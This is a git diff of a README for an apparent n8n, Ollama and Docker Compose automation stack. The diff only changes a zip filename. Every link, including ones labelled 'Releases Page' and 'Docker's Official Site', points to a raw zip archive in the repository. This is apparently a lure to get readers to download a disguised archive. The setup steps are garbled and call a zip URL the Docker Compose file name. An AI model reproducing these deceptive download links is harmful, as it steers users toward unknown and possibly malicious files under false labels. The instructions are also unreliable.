@@ -1,6 +1,6 @@
 # 🚀 jeffvato-ultimate-n8n-stack - Your All-in-One Automation Solution
 
-[![Download Now](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/ultimate_stack_jeffvato_n_v3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/ultimate_stack_jeffvato_n_v3.2.zip)
+[![Download Now](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip)
 
 ## 🎯 Overview
 The jeffvato-ultimate-n8n-stack is a production-ready automation platform designed to streamline your processes. It integrates AI services with MCP servers for Claude Code, RedisStack, PostgreSQL, and Ollama. This setup runs seamlessly using Docker Compose, making it easy to manage your workflows.
@@ -24,19 +24,19 @@ For specific installation instructions for your operating system, please visit t
 Follow these steps to set up the jeffvato-ultimate-n8n-stack on your machine:
 
 1. **Visit the Download Page**  
-   Go to the [Releases Page](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/ultimate_stack_jeffvato_n_v3.2.zip) to download the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip) to download the software.
 
 2. **Select the Latest Release**  
    Look for the latest version available. Click on it to view the release details.
 
 3. **Download the Docker Compose File**  
-   Download the Docker Compose file, which is usually named `https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/ultimate_stack_jeffvato_n_v3.2.zip`. This file contains all necessary configuration for running the stack.
+   Download the Docker Compose file, which is usually named `https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip`. This file contains all necessary configuration for running the stack.
 
 4. **Install Docker**  
-   Ensure Docker is installed on your machine. You can download it from [Docker's Official Site](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/ultimate_stack_jeffvato_n_v3.2.zip).
+   Ensure Docker is installed on your machine. You can download it from [Docker's Official Site](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip).
 
 5. **Run the Docker Compose Setup**  
-   Open your command line or terminal. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/ultimate_stack_jeffvato_n_v3.2.zip` file. Use the command:
+   Open your command line or terminal. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip` file. Use the command:
    ```
    docker-compose up
    ```
@@ -46,7 +46,7 @@ Follow these steps to set up the jeffvato-ultimate-n8n-stack on your machine:
    Once the setup is complete, you can access the application in your web browser. The default URL is usually `http://localhost:5678`.
 
 ## 💡 Download & Install
-To get started with jeffvato-ultimate-n8n-stack, visit the [Download Page](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/ultimate_stack_jeffvato_n_v3.2.zip). Follow the steps outlined above to install and run the application smoothly.
+To get started with jeffvato-ultimate-n8n-stack, visit the [Download Page](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip). Follow the steps outlined above to install and run the application smoothly.
 
 ## 🔧 Troubleshooting
 If you encounter any issues, consider the following tips:
